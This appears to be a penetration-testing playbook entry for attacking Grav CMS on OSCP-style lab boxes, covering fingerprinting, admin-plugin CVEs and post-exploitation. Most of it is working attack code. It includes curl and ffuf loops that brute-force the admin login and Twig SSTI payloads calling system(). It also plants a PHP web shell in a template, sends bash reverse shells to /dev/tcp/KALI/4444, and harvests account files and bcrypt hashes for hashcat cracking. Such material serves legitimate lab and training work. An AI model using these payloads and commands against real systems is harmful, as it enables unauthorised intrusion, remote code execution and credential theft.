title: Grav CMS — Fingerprinting and Exploitation
body:
Grav is a flat-file PHP CMS — no database, content stored in YAML and Markdown. It uses Twig as its templating engine, which is the source of most of its remotely-exploitable vulnerabilities. Grav appears regularly on PG Practice, HTB, and OSCP-style boxes because the admin plugin has had several RCE chains over the years and because misconfigurations are common.

If you're looking at a PHP site with no database and the URL or page source mentions 'Grav', you're here.

— FINGERPRINTING — IS THIS GRAV? —

  Multiple signals confirm Grav:

  HEADERS:
    X-Powered-By: Grav
    X-Generator: Grav

  HTML META TAGS:
    <meta name="generator" content="Grav" />
    <meta name="generator" content="Grav v1.7.X" />  (version disclosed!)

  COMMON PATHS:
    /admin                      Admin plugin login (high-value target)
    /user/                      User content directory (sometimes browsable)
    /system/                    Core Grav system files
    /cache/                     Cache directory
    /assets/                    Static assets
    /robots.txt                 Often discloses /admin and /user
    /CHANGELOG.md               Sometimes left in webroot — version history

  RESPONSE QUIRKS:
    404 pages have a 'Powered by Grav' footer by default
    Asset URLs use /assets/ rather than /wp-content or /sites
    Page URLs are clean (no .php extension visible)

  Quick fingerprint commands in the cmd block.

— THE ATTACK SURFACE — IN PRIORITY ORDER —

  1. ADMIN PLUGIN LOGIN AT /admin (highest value)
     Default install has no admin user — first visit to /admin lets you
     CREATE the admin account. If the box was set up sloppily and /admin
     is unprotected, you get admin without exploiting anything.
     Always try /admin first.

  2. KNOWN CVEs IN ADMIN PLUGIN
     CVE-2021-21425 — admin authenticated arbitrary file read
     CVE-2022-2073  — admin Twig SSTI to RCE (auth required)
     CVE-2023-34253 — admin authenticated RCE via tasks plugin
     CVE-2024-28116 — admin SSTI via Pages context
     Several have public PoCs on GitHub. Authenticated, but admin auth
     is often the easy part on lab boxes.

  3. TWIG TEMPLATE INJECTION (UNAUTH IF MISCONFIGURED)
     Custom themes or plugins that pass user input to Twig render
     functions create SSTI. Common in custom development on Grav installs.
     Test with: {{7*7}} → if response shows 49, you have SSTI.
     Twig SSTI escalates to RCE quickly via PHP filter functions.

  4. WEAK / DEFAULT CREDENTIALS
     admin / admin
     admin / password
     admin / grav
     Lab boxes occasionally ship with these. Always try.

  5. CONFIGURATION DISCLOSURE
     /system/config/site.yaml may leak email addresses, API keys
     /user/accounts/*.yaml stores account data including hashed passwords
     Hashed passwords are bcrypt — slow to crack but not impossible

  6. UPLOAD-BASED RCE (POST-AUTH)
     Once admin, the Pages editor lets you upload files to specific
     locations. PHP files in /assets/ are typically not executed (config
     blocks them) but Twig templates in /user/themes/<theme>/templates/
     ARE executed and can include arbitrary PHP via the Twig PHP function.

— THE CANONICAL EXPLOITATION CHAIN —

  Lab box pattern, in order:

  Step 1: Fingerprint Grav (curl headers + view source)
  Step 2: Try /admin — is the admin account creation page open?
          If yes: create admin → skip to step 5
  Step 3: Try default credentials at /admin
  Step 4: Test for SSTI on user-input fields ({{7*7}} probe)
  Step 5: With admin, navigate to Pages → New Page → set Page Type to a
          template you can inject Twig into
  Step 6: Inject {{['id']|map('system')|join(',')}} or similar Twig RCE
  Step 7: Get reverse shell

  Several CVEs short-circuit this chain — checking known CVEs against the
  installed version (visible in /admin source or CHANGELOG.md) is faster
  than rediscovering the same SSTI manually.

— POST-EXPLOITATION ON A GRAV BOX —

  Files of interest (after RCE):

  /var/www/html/grav/user/config/system.yaml
    Site configuration — sometimes contains SMTP credentials

  /var/www/html/grav/user/accounts/*.yaml
    User account files — contains email, hashed password (bcrypt)

  /var/www/html/grav/.htaccess
    Often reveals admin path customization

  /var/www/html/grav/logs/grav.log
    Application logs — sometimes contain stack traces with paths/info

  Check for SSH keys in user homes, sudo rules, cron jobs — Grav usually
  runs as www-data, so privesc is the next step after foothold.
cmd:
# ── FINGERPRINTING ────────────────────────────────────
# Quick header check
curl -sI http://$ip/ | grep -iE 'powered|generator|grav'

# Source check for meta generator
curl -s http://$ip/ | grep -iE 'generator|grav'

# Common Grav paths
for p in admin user system cache assets robots.txt CHANGELOG.md; do
  echo "=== /$p ==="
  curl -s -o /dev/null -w '%{http_code}\n' http://$ip/$p
done

# Quick whatweb check
whatweb http://$ip/

# Version disclosure (if present in meta tag or CHANGELOG)
curl -s http://$ip/CHANGELOG.md | head -30
curl -s http://$ip/ | grep -oE 'Grav v?[0-9]+\.[0-9]+\.[0-9]+'

# Wappalyzer-style fingerprint:
whatweb -v http://$ip/ 2>&1 | grep -i grav

# ── STEP 1: TRY /admin — ZERO-TRY ADMIN CREATION ─────
# Grav with admin plugin installed but no admin user yet:
# /admin will serve a 'Create Admin Account' form
# Just fill it out and you're admin
curl -s http://$ip/admin/ | grep -iE 'create.*admin|sign.*up|register'

# Visit in browser:
firefox http://$ip/admin

# ── STEP 2: TRY DEFAULT CREDENTIALS ──────────────────
# Common defaults on lab boxes:
for pass in admin password grav root toor 12345 admin123; do
  echo "=== Trying admin:$pass ==="
  curl -s -c /tmp/grav_cookies -b /tmp/grav_cookies \
    -X POST http://$ip/admin/task:login \
    -d "data[username]=admin&data[password]=$pass" \
    -o /tmp/grav_resp.html
  if grep -q 'Welcome\|dashboard\|logout' /tmp/grav_resp.html 2>/dev/null; then
    echo "[+] WORKED: admin:$pass"
    break
  fi
done

# Or use ffuf for cleaner brute:
ffuf -u http://$ip/admin/task:login \
  -X POST -d 'data[username]=admin&data[password]=FUZZ' \
  -w /usr/share/wordlists/rockyou.txt \
  -fs <length-of-failed-response>

# ── STEP 3: TWIG SSTI PROBE ──────────────────────────
# Test any user-input field for Twig SSTI:
curl -s "http://$ip/path?param={{7*7}}"
# Look for '49' in the response

# More thorough probes:
curl -s "http://$ip/path?p={{ 'test' }}"             # literal test
curl -s "http://$ip/path?p={{config}}"               # config dump
curl -s "http://$ip/path?p={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"

# Search forms, comment fields, contact forms — anywhere user input might
# end up in a Twig render call.

# ── STEP 4: KNOWN CVE EXPLOITATION ────────────────────

# CVE-2022-2073 — Admin Twig SSTI (auth required)
# https://github.com/Pommaq/CVE-2022-2073
# Public PoCs exist — search before reinventing
searchsploit grav
searchsploit grav admin

# CVE-2023-34253 — Authenticated RCE via tasks
# Affects Grav 1.7.42 and earlier
git clone https://github.com/Hzllaga/CVE-2023-34253
cd CVE-2023-34253
python3 exploit.py -u http://$ip -U admin -P password -c 'id'

# CVE-2024-28116 — Authenticated SSTI in Pages context
# https://github.com/advisories/GHSA-2m7v-gc89-fjqf

# Always check current version against published advisories:
searchsploit grav
sploitus 'grav cms'
# Or browse: https://github.com/getgrav/grav/security/advisories

# ── STEP 5: ADMIN-AUTHENTICATED RCE VIA TWIG ─────────
# After login at /admin, navigate to:
# Pages → New Page (or edit existing)
# Page Type: Default (or any template you can edit)
# In the page content (Markdown), inject Twig:

cat <<'EOF'
---
title: Pwn
template: default
---
{{ ['id']|map('system')|join(',') }}
EOF

# More direct RCE via filter abuse:
{{ {'<?php system($_GET[c]); ?>'|filter('system')} }}

# Rev shell via Twig:
{{ ['bash -c "bash -i >& /dev/tcp/KALI/4444 0>&1"']|map('system')|join('') }}

# Save the page, visit it — RCE fires.

# ── STEP 6: REVERSE SHELL DELIVERY ────────────────────
# Listener first:
rlwrap -cAr nc -lvnp 4444

# Trigger via the injected page (visit the URL where you saved the Twig)
curl -s http://$ip/pwn

# Or one-shot via SSTI (no admin needed if SSTI exists pre-auth):
PAYLOAD='{{["bash -c \"bash -i >%26 /dev/tcp/KALI/4444 0>%261\""]|map("system")|join("")}}'
curl -s "http://$ip/vuln_endpoint?param=$PAYLOAD"

# ── STEP 7: POST-EXPLOITATION FILES ──────────────────
# After getting www-data shell, harvest these files:

cat /var/www/html/grav/user/config/system.yaml
cat /var/www/html/grav/user/accounts/*.yaml         # bcrypt hashes
cat /var/www/html/grav/.htaccess
ls -la /var/www/html/grav/logs/
cat /var/www/html/grav/logs/grav.log | tail -100

# Look for SSH keys, sudo rules, cron jobs:
ls -la /home/*/.ssh/ 2>/dev/null
sudo -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.* 2>/dev/null

# Check for other web roots (Grav may not be the only app):
ls -la /var/www/
ls -la /opt/ /srv/

# ── BONUS: GRAV USER ACCOUNT FILE PARSING ────────────
# Grav stores user accounts as YAML files
# /user/accounts/<username>.yaml
#
# Format:
#   email: user@example.com
#   fullname: Some Name
#   title: Administrator
#   state: enabled
#   access:
#     admin:
#       login: true
#       super: true
#   hashed_password: $2y$10$...
#
# Bcrypt hashes — slow to crack but not impossible:
echo '$2y$10$abcd...' > /tmp/grav.hash
hashcat -m 3200 /tmp/grav.hash /usr/share/wordlists/rockyou.txt
# Lab boxes: rockyou usually works
# Real engagements: use targeted wordlists
warn:
/admin OPEN-ACCOUNT-CREATION IS A LAB-BOX BEHAVIOR:
  On real Grav installs, the admin account is created during installation
  and /admin shows a login form (not a creation form). On lab boxes that
  were spun up sloppily, /admin sometimes shows the creation form because
  the install script never finished. Try it first — if you can create the
  admin account, you've skipped the entire exploitation chain.

GRAV IS FLAT-FILE — NO DATABASE TO DUMP:
  Don't waste time looking for SQL injection. Grav stores everything in
  YAML and Markdown files. The 'database' is /user/pages/ for content and
  /user/accounts/ for users. Direct file system access (via LFI or RCE)
  is what gets you the data.

TWIG SSTI ESCALATION TO RCE IS NOT INSTANT:
  Older Twig versions had direct PHP function access. Modern Twig sandboxes
  most dangerous functions. Common bypasses use the |filter() and |map()
  functions to call arbitrary callbacks. If {{7*7}} returns 49 but
  {{ ['id']|map('system') }} returns nothing, the sandbox is enforced —
  you'll need a more creative bypass. Search 'twig ssti rce bypass' for
  current techniques.

ADMIN PLUGIN VERSION VS GRAV CORE VERSION:
  Grav (the core) and Admin Plugin (the WP-style admin UI) version
  separately. CVE advisories list the admin plugin version, not Grav core.
  When checking exploitability:
    /admin/login.json shows admin plugin version
    /CHANGELOG.md shows Grav core version
  Match CVE advisories carefully — wrong version comparison wastes time.

UPLOAD-BASED PHP RCE OFTEN BLOCKED BY CONFIG:
  /assets/ usually has 'php_admin_flag engine off' in .htaccess or nginx
  equivalent — uploaded PHP doesn't execute there. The path that works:
  /user/themes/<theme>/templates/ — Twig templates execute and can
  contain arbitrary PHP via {% set var = '<?php system($_GET[c]); ?>' %}
  written into a .html.twig file. Confirm by curling the saved template path.

CSRF TOKENS ARE ENFORCED IN /admin POSTS:
  Grav admin endpoints check the CSRF nonce. Login form has a hidden token
  that changes per session. Brute-force scripts must capture the token
  from the login page first, then include it in each attempt. Curl alone
  won't work for sustained brute-force — use a wrapper that handles tokens.

LAB BOXES HIDE GRAV BEHIND VHOSTS:
  Some lab box configurations put Grav on a vhost (e.g. grav.target.local)
  while serving a different site on the bare IP. Always check /etc/hosts
  entries from any rev shell, and add discovered hostnames to /etc/hosts
  on Kali. /admin on the IP may 404 while /admin on the vhost works.

CVE PoCs FROM GITHUB ARE OFTEN SLOPPY:
  Many published Grav CVE PoCs work but include hardcoded paths, missing
  error handling, or unnecessary dependencies. Read the PoC before running
  — sometimes the actual exploitation is just one curl line you can run
  yourself. See evaluate_public_exploits node for the framework.

choices.label: Got admin login — exploit known CVE for RCE
Got SSTI — escalate to reverse shell
Check searchsploit for more Grav exploits
Need to test SSTI more thoroughly
Need to fuzz for hidden admin paths
